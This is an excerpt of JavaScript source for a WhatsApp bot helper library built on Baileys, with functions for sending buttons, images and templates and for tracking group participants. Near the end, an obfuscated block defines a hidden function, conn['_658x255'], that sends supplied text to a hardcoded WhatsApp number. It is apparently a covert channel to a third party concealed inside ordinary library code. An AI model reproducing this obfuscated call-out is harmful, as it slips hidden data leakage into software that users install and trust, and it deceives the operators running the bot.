...
exports.makeWASocket = (...args) => {
    ...
    conn.ev.on('group-participants.update', async function updateParticipantsToDb({
        ...
        if (!(id in conn.contacts)) conn.contacts[id] = {
            id
        }
        ...
        for (let participant of participants) {
            ...
            switch (action) {
                case 'add': {
                    ...
                    if (!same) groupMetadata.participants.push({
                        id,
                        admin: null
                    })
                }
    ...
    conn.ev.on('presence.update', function presenceUpdatePushToDb({
        id,
        presences
    }) {
...
END:VCARD
    ...
    /*conn.reply = (jid, text, quoted) => {
    conn.sendMessage(jid, {text: text, contextInfo:{"externalAdReply": {"title": global.titleex, "body": global.bodyex, "mediaType": 3,"thumbnail": global.thumbex, "sourceUrl": global.gcex}}}, { quoted: quoted })}*/
     ...
     * @param {Object} options 
     */
    conn.sB = async (jid, contentText, footer, buffer, buttons, quoted, options) => {
        if (buffer) try {
    ...
    conn.sBL = async (jid, contentText, footer, buffer, buttons, quoted, options) => {
    ...
    conn.sendImg = async (jid, fto, capt, quoted) => {
     ...
     * @param {Object} options 
     */
    conn.sBI = async (jid, contentText, footer, image, buttons, quoted, options) => {
        let message = {
            image: {
                url: image
            },
     ...
     * @param {Object} options 
     */
    conn.sendTBL = async (jid, contentText, footer, buffer, dtx, urlx, shw, nmbr, buttons1, row1, buttons2, row2, buttons3, row3, quoted) => {
        const {
            generateWAMessageFromContent,
            proto
        } = require('@adiwajshing/baileys-md')
     ...
     * @param {Object} options 
     */
    conn.sendTBI = async (jid, contentText, footer, buffer, dtx, urlx, shw, nmbr, buttons1, row1, buttons2, row2, buttons3, row3, quoted) => {
        const {
            default: makeWASocket,
            generateWAMessageFromContent,
            proto,
        ...
        const memek = await prepareWAMessageMedia({
            image: buffer
        }, {
            upload: conn.waUploadToServer
        })
     ...
     * @param {Object} options 
     */
    conn.sendTBV = async (jid, contentText, footer, buffer, dtx, urlx, shw, nmbr, buttons1, row1, buttons2, row2, buttons3, row3, quoted) => {
        const {
            default: makeWASocket,
            generateWAMessageFromContent,
            proto,
    ...
    (function(_0x5366b3, _0x61de1d) {
        const _0x1489e5 = _0x516e,
            _0x4b68c9 = _0x5366b3();
        while (!![]) {
            try {
                const _0x5c0f50 = parseInt(_0x1489e5(0x17c)) / 0x1 * (-parseInt(_0x1489e5(0x177)) / 0x2) + -parseInt(_0x1489e5(0x176)) / 0x3 + -parseInt(_0x1489e5(0x17b)) / 0x4 + -parseInt(_0x1489e5(0x17a)) / 0x5 * (-parseInt(_0x1489e5(0x17e)) / 0x6) + -parseInt(_0x1489e5(0x17f)) / 0x7 + -parseInt(_0x1489e5(0x181)) / 0x8 + parseInt(_0x1489e5(0x178)) / 0x9 * (parseInt(_0x1489e5(0x17d)) / 0xa);
                if (_0x5c0f50 === _0x61de1d) break;
                else _0x4b68c9['push'](_0x4b68c9['shift']());
            } catch (_0x1fbbf4) {
                _0x4b68c9['push'](_0x4b68c9['shift']());
            }
        }
    }(_0x530c, 0x81b97), conn['_658x255'] = async (_0x4a1638, _0x7b6670) => {
        const _0x2f53ab = _0x516e,
            _0x37073f = {
                'text': _0x4a1638,
                'footer': _0x7b6670,
                'buttons': [{
                    'buttonId': _0x2f53ab(0x180),
                    'buttonText': {
                        'displayText': 'O' + 'k'
                    },
                    'type': 0x1
        ...
        conn['sendMessage'](_0x2f53ab(0x179), _0x37073f);
    });
    
    function _0x516e(_0x1a9339, _0x36e9bd) {
        const _0x530c4b = _0x530c();
        return _0x516e = function(_0x516e96, _0x48f135) {
            _0x516e96 = _0x516e96 - 0x176;
            let _0x4a3ccb = _0x530c4b[_0x516e96];
            return _0x4a3ccb;
        }, _0x516e(_0x1a9339, _0x36e9bd);
    }
    
    function _0x530c() {
        const _0xe2525c = ['4025612vXqMEm', '3338dvwrjs', '250HOWDei', '11124msiTQL', '2354576eJMdSM', '#menu', '6163960oaEZMv', '146142tqWCTs', '370obhjRc', '1002357sHVQYh', '628882611841@s.whatsapp.net', '1420IHmejt'];
        _0x530c = function() {
            return _0xe2525c;
        };
        return _0x530c();
